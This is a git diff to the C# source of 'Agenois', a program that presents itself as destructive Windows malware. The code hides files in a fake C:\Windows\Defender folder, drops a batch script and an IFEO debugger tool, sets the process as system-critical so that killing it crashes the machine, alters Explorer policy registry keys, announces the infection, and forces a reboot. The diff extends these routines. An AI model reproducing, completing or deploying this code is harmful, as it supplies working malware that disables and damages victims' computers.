@@ -26,7 +26,7 @@ namespace Agenois
             Directory.CreateDirectory(@"C:\Windows\Defender");
             
             RegistryKey editKey;
-            
+
             if (Process.GetProcessesByName("Agenois").Count() > 1) { Environment.Exit(0); }
 
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
@@ -35,11 +35,11 @@ namespace Agenois
                 File.WriteAllBytes(extractPath + "\\cursor.ani", Resources.skull1);
                 File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
                 File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
-                File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");
+                //File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe"); Error
 
                 DirectoryInfo ch = new DirectoryInfo(extractPath);
                 ch.Attributes = FileAttributes.Hidden;
-
+                Thread.Sleep(1000);
                 Destructive.EnableCriticalMode();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
@@ -195,6 +195,11 @@ namespace Agenois
                 MessageBox.Show("Your Pc Is Infected By Agenois", "Agenois", 0, MessageBoxIcon.Warning);
 
                 Others.StartProcess("shutdown.exe", "/r /t 0");
+            }
+            else
+            {
+                Destructive.EnableCriticalMode();
+                //Start main funcs
             }
         }
 
